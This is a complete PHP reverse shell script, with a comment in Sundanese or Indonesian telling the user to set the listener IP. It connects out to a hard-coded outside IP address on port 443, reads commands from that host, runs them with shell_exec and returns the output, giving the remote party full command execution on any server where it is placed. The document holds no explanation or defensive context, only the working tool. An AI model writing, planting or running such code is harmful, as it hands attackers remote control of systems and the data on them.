<?php
$ip = "149.28.154.229"; // Ganti ku IP listener
$port = 443;

$socket = fsockopen($ip, $port);
if ($socket) {
    fwrite($socket, "Connected to Reverse Shell\n");
    while (!feof($socket)) {
        $command = fgets($socket, 1024);
        $output = shell_exec($command);
        fwrite($socket, $output);
    }
    fclose($socket);
}
?>
